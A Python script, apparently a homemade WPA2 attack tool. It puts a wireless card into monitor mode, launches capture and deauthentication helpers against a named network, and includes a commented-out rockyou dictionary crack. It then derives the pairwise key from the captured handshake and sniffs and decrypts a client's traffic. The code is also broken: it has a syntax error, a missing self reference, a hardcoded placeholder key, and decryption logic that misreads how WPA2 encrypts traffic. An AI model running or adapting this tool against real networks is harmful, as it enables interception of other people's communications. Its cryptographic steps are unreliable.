import sys
import os
import os.path
from scapy.all import *
import subprocess as sub
import WPA2
from binascii import *
import Handshake


class sniffer():
	def __init__(self):
		self.dfilepath = str(sub.run("pwd", capture_output=True).stdout)[2:-3]

		start = input("First time starting up? [Y/N]:")

		if start == "Y" or start == "y":
			# put everything in monitor mode when starting up
			print("Killing services")
			os.system("sudo airmon-ng check kill")
			print("Starting wlan1mon")
			os.system("sudo airmon-ng start wlan1 1")
			print("Done")

		print("Which wifi do you want to crack")

		self.wifi = "4B1"#input("Wifi name: ")
		self.find_mac()

		print("Starting to sniff")
		self.sniff_packets()

	def find_mac(self):
		print("Finding Mac-Adress")

		os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >".format(self.wifi) + self.dfilepath + "/output.txt")

		wifi_list = open(self.dfilepath + "/output.txt", 'r').read()
		index = wifi_list.index("Address")

		self.mac = wifi_list[index + len("Address: "):index + len("Address: ") + 17]
		self.get_master_key()

	def get_master_key(self):
		# code for cracking the key
		# find key using the iv's in .cap file
		if not os.path.isfile(self.dfilepath + "/WPA_{}-01.cap".format(self.mac)):
			self.make_cap()

		print("Cracking the key")
		#		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + "/home/kali/rockyou.txt>" + self.dfilepath + "/key_info.txt")
		#		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
		#		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
		self.master_key = "123456781234567f"

		#		while key_file[index] != ' ':
		#			self.master_key += key_file[index]
		#			index += 1

		print("Key has been found: {}".format(self.master_key))
		print("Finding transient key")

		self.get_transient_key()

	def condense_mac(self, mac):
		condensed_mac = ""

		for i in range(len(mac)):
			if ((i+1) % 3) != 0:
				condensed_mac += mac[i]

		return condensed_mac

	def fill_master_key(self):
		if len(self.master_key) < 16:
			while len(self.master_key) < 16:
				self.master_key += "0"
		elif len(self.master_key) < 24:
			while len(self.master_key) < 24:
				self.master_key += "0"
		else
			while len(self.master_key) < 32:
				self.master_key += "0"

	def get_transient_key(self):
		password = fill_master_key()
		ssid = self.wifi
		capfile = rdpcap(self.dfilepath + "/WPA_{}-01.cap".format(self.mac))
		handshakes = []
		for i in capfile:
			if i.haslayer(EAPOL):
				handshakes.append(i)

		if len(handshakes) > 4:
			handshakes = Handshake.handshake_sorter(handshakes)
			if len(handshakes) == 0:
				print('No complete Handshake')
		elif len(handshakes) < 4:
			print('No complete handshake')
		else:
			if bytes_hex(handshakes[0][Raw]).decode('utf-8')[154:186] != '0' * 32:
				print('No complete handshake')

		load1 = hexlify(bytes(handshakes[0][EAPOL][Raw])).decode('utf-8')
		load2 = hexlify(bytes(handshakes[1][EAPOL][Raw])).decode('utf-8')

		assert self.mac.lower() == handshakes[0].addr2
		mac_ap = a2b_hex(self.condense_mac(self.mac))
		mac_cl_bin = a2b_hex(self.condense_mac(handshakes[0].addr1))
		
		self.mac_cl = handshakes[0].addr1

		anonce = a2b_hex(load1[26:90])
		snonce = a2b_hex(load2[26:90])

		PKE = "Pairwise key expansion"  # Standard Set Value so we don't know what it is
		PMK = Handshake.pmk_generation(password, ssid)
		key_data = str(min(mac_ap, mac_cl_bin) + max(mac_ap, mac_cl_bin) + min(anonce, snonce) + max(anonce, snonce))
		PTK = Handshake.ptk_generation(PMK, PKE, key_data)

		self.transient_key = WPA2.key_to_matrix(PTK)
		print(self.transient_key)
		nb_cols = len(self.transient_key[0])

		self.rounds = 10

		if nb_cols == 24:
			self.rounds = 12
		elif nb_cols == 32:
			self.rounds = 14

	def decrypt(self, packet):
		encrypted_mess = self.make_matrix(bytes_hex(packet.getlayer(Raw)))
		
		unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.transient_key, self.rounds)
		#unencrypted_mess = self.filter_packets(unencrypted_mess)
		return unencrypted_mess

	def filtersniff(self, packet):
		if packet is None:
			pass
		elif packet.haslayer(Raw):
			if (packet.addr1 == self.mac_cl) or (packet.addr2 == self.mac_cl):				
				return packet

	def sniff_packets(self):
		print(self.mac_cl)
		sniff(iface="wlan1mon", lfilter=self.filtersniff, prn=self.decrypt)

	def filter_packets(self, message):
		alfabet = [chr(elem) for elem in range(48, 123)]
		filtered_message = ""

		for elem in message:
			if elem == " ":
				filtered_message += " "
			if elem in alfabet or elem.isdigit():
				filtered_message += elem
			else:
				continue

		if len(filtered_message) < 5:
			return ''

		return filtered_message

	def make_cap(self):
		process2 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AirodumpWPA2.py {} {}".format(self.mac, self.dfilepath)])
		process1 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AireplayWPA2.py {}".format(self.mac)])
		process1.wait()
		process2.wait()

	def make_matrix(self, encrypted_message):
		encrypted_message = encrypted_message.decode('utf-8')
		encrypted_matrix = [[0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0], [0, 0, 0, 0]]

		for i in range(4):
			for j in range(4):
				if len(encrypted_message) == 0:
					break


				buff = encrypted_message[:2]

				encrypted_message = encrypted_message[2:]
				encrypted_matrix[j][i] = int(buff, 16)

		return encrypted_matrix	


sniffer()
